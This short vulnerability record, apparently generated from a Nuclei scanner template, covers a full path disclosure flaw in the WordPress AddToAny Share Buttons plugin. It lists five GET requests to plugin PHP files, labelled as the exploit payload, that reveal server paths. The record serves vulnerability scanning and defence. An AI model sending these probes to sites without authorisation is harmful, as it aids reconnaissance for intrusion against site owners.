# Vulnerability: WordPress AddToAny Share Buttons Plugin - Full Path Disclosure
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wp-add-to-any-fpd.yaml`)

## Description
The AddToAny Share Buttons plugin for WordPress was detected to be vulnerable to Full Path Disclosure, allowing unauthenticated access to the full application path.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/add-to-any/add-to-any.php
GET {{BaseURL}}/wp-content/plugins/add-to-any/addtoany.php
GET {{BaseURL}}/wp-content/plugins/add-to-any/includes/addtoany.class.php
GET {{BaseURL}}/wp-content/plugins/add-to-any/admin/class-addtoany-admin.php
GET {{BaseURL}}/wp-content/plugins/add-to-any/admin/settings.php
```

